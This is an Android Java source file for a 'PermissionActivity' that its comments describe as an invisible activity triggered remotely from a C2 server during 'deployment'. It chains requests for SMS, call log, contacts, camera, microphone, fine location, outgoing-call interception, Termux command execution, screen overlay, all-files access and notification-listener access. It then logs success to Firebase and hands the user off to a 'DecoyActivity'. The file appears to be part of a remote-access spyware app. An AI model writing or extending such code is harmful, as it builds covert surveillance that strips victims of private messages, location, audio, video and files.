package com.labs.labrats;

import android.Manifest;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.net.Uri;
import android.os.Build;
import android.os.Bundle;
import android.os.Environment;
import android.provider.Settings;
import android.util.Log;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;
import java.util.List;

/**
 * Invisible activity used to trigger system permission prompts remotely from the C2.
 * This activity handles the "Permission Chain" during initial deployment.
 */
public class PermissionActivity extends AppCompatActivity {

    private static final int PERMISSION_REQUEST_CODE = 2001;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        // Activity is transparent via theme in Manifest
        getWindow().setGravity(android.view.Gravity.BOTTOM);
        
        Log.d("PermissionActivity", "Deployment permission sequence initiated.");
        requestAllStandardPermissions();
    }

    private void requestAllStandardPermissions() {
        List<String> permissionsNeeded = new ArrayList<>();

        // 1. File Access (Standard)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_IMAGES) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_IMAGES);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_VIDEO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_VIDEO);
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_MEDIA_AUDIO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_MEDIA_AUDIO);
        } else {
            if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_EXTERNAL_STORAGE);
            if (Build.VERSION.SDK_INT <= Build.VERSION_CODES.Q) {
                if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.WRITE_EXTERNAL_STORAGE);
            }
        }

        // 2. Comms
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_CALL_LOG) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.WRITE_CALL_LOG);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_CONTACTS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_CONTACTS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CALL_PHONE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.CALL_PHONE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_SMS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.SEND_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.SEND_SMS);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECEIVE_SMS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.RECEIVE_SMS);
        if (ContextCompat.checkSelfPermission(this, "android.permission.WRITE_SMS") != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add("android.permission.WRITE_SMS");

        // 3. Sensors / Hardware
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.ACCESS_FINE_LOCATION);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.ACCESS_COARSE_LOCATION) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.ACCESS_COARSE_LOCATION);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.CAMERA) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.CAMERA);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.RECORD_AUDIO) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.RECORD_AUDIO);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.READ_PHONE_STATE) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.READ_PHONE_STATE);
        if (ContextCompat.checkSelfPermission(this, Manifest.permission.PROCESS_OUTGOING_CALLS) != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add(Manifest.permission.PROCESS_OUTGOING_CALLS);

        // 4. Termux Bridge
        if (ContextCompat.checkSelfPermission(this, "com.termux.permission.RUN_COMMAND") != PackageManager.PERMISSION_GRANTED) permissionsNeeded.add("com.termux.permission.RUN_COMMAND");

        if (!permissionsNeeded.isEmpty()) {
            ActivityCompat.requestPermissions(this, permissionsNeeded.toArray(new String[0]), PERMISSION_REQUEST_CODE);
        } else {
            checkSpecialPermissions();
        }
    }

    private void checkSpecialPermissions() {
        // 1. Appear on Top (Overlay)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M && !Settings.canDrawOverlays(this)) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 2003);
                return;
            } catch (Exception e) {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION), 2003);
                    return;
                } catch (Exception ignored) {}
            }
        }

        // 2. All Files Access (Android 11+)
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R && !Environment.isExternalStorageManager()) {
            try {
                Intent intent = new Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION, Uri.parse("package:" + getPackageName()));
                startActivityForResult(intent, 2004);
                return;
            } catch (Exception e) {
                try {
                    startActivityForResult(new Intent(Settings.ACTION_MANAGE_ALL_FILES_ACCESS_PERMISSION), 2004);
                    return;
                } catch (Exception ignored) {}
            }
        }

        // 3. Notification Access (Listener)
        if (!isNotificationServiceEnabled()) {
            try {
                Intent intent = new Intent("android.settings.ACTION_NOTIFICATION_LISTENER_SETTINGS");
                startActivityForResult(intent, 2005);
                return;
            } catch (Exception ignored) {}
        }

        finishSequence();
    }

    private boolean isNotificationServiceEnabled() {
        String pkgName = getPackageName();
        final String flat = Settings.Secure.getString(getContentResolver(), "enabled_notification_listeners");
        if (flat != null && !flat.isEmpty()) {
            final String[] names = flat.split(":");
            for (String name : names) {
                final android.content.ComponentName cn = android.content.ComponentName.unflattenFromString(name);
                if (cn != null && pkgName.equals(cn.getPackageName())) return true;
            }
        }
        return false;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
        // Note: Background location request has been removed per user request.
        checkSpecialPermissions();
    }

    @Override
    protected void onActivityResult(int requestCode, int resultCode, Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        // Loop back to check the remaining special permissions in the chain
        checkSpecialPermissions();
    }

    private void finishSequence() {
        Log.d("PermissionActivity", "Permission sequence complete.");
        FirebaseConfig.logActivity("DEPLOYMENT_SYNC: Full permission set granted.");
        // Toast removed to allow DecoyActivity to handle the Success UI transition
        setResult(9999);
        finish();
    }
}
